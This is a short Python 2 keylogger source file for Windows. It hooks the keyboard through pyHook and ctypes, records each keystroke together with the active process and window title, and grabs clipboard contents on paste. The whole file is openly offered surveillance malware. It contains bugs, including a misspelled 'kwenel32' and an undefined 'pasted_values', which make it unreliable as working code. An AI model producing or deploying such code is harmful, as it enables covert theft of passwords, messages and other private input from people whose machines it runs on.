#keylogger.py

from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
key_buffer = []
def get_current_process():
    #get a handle for forground window
    hwnd= user32.GetForegroundWindow()
    
    #find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    
    #store the current process ID
    process_id = "%d" %pid.value
    
    #grab the executable
    executable = create_string_buffer("\x00" *512)
    h_process= kernel32.OpenProcess(0x400 | 0x10, False, pid)
    
    psapi.GetModuleBaseName(h_process, None, byref(executable), 512)
    
    #now read its title
    window_title = create_string_buffer("\x00" *512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
    
    #print out the header if we're in the right process
    print
    print "[PID: %s - %s - %s]" %(process_id, executable.value, window_title.value)
    print
    
    #close handles
    kernel32.CloseHandle(hwnd)
    kwenel32.CloseHandle(h_process)
    
    
    
def KeyStroke(event):
    global current_window
    global key_buffer
    #check if window has changed
    if event.WindowName!= current_window:
        current_window = event.WindowName
        get_current_process()
        
    #if they pressed a standard key
    if event.Ascii > 32 and event.Ascii <127:
        print chr(event.Ascii)
        key_buffer.append(event.Ascii)
        
    else:
        #if ctrl-v, get the value on clipboard
        if event.Key=="V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            
            print "[PASTE] - %s" %(pasted_value)
            key_buffer.append(pasted_values)
            
        else:
            print "[%s]" %event.Key
            key_buffer.append(event.Key)
            
        
    #pass execution to next hook registered
    return True

#create and register a hook manager
def run():
    k1= pyHook.HookManager()
    k1.KeyDown=KeyStroke
    #register the hook and execute forever
    k1.HookKeyboard()
    pythoncom.PumpMessages()
    
    return key_buffer